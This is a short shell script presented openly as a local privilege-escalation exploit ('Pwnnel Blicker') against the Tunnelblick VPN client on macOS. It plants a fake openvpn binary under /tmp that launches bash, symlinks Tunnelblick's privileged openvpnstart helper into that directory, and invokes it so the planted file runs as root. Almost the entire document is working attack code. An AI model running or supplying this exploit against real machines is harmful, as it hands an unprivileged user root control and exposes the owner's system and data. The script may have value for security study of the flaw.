#!/bin/sh

#### Pwnnel Blicker ####
#       for kids       #
#                      #
#         zx2c4        #
#                      #
########################

# This is another exploit for Tunnel Blick.
# Other exploits for Tunnel Blick are available here:
#      http://git.zx2c4.com/Pwnnel-Blicker/tree/



echo "[+] Making vulnerable directory."
mkdir -pv /tmp/pwn/openvpn/openvpn-0

echo "[+] Preparing payload."
cat > /tmp/pwn/openvpn/openvpn-0/openvpn <<_EOF
#!/bin/sh
echo "[+] Cleaning up."
rm -rfv /tmp/pwn
echo "[+] Getting root."
exec bash
_EOF
chmod -v +x /tmp/pwn/openvpn/openvpn-0/openvpn

echo "[+] Creating symlink."
ln -s -v -f /Applications/Tunnelblick.app/Contents/Resources/openvpnstart /tmp/pwn/start

echo "[+] Triggering vulnerable program."
exec /tmp/pwn/start OpenVPNInfo 0